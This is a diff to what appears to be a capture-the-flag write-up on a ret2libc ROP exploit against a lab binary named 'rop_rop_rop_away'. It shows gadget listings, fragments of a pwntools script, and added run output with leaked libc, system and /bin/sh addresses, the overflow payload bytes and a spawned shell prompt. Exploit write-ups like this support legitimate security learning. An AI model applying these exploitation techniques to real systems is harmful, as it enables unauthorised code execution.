@@ -165,7 +165,7 @@ ROPgadget --binary rop_rop_rop_away | grep 'ret'
 0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
 0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
 ```
-Putting all of it together, We should spawn a shell. Here is the final exploit. 
+Putting all of it together, our exploit should work. Here is the final exploit. 
 ```python
 from pwn import *
 import re
@@ -201,4 +201,27 @@ p.sendline(payload)
 p.interactive()
 ```
 
-
+```bash
+python solve.py 
+[*] '/home/osboxes/Desktop/solver/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/home/osboxes/Desktop/solver/rop_rop_rop_away'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/home/osboxes/Desktop/solver/rop_rop_rop_away': pid 59235
+[+] libc base 0x7ffff7dc2000
+[+] system 0x7ffff7e17410
+[+] /bin/sh 0x7ffff7f795aa
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12\x00\x00\x00\x95���\x00\x1a@\x00\x00\x00t���\x7f\x00
+[*] Switching to interactive mode
+Enter your character name: Welcome BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBs\x12 to BOF wonderland!
+Goodbye!
+$ 
+```
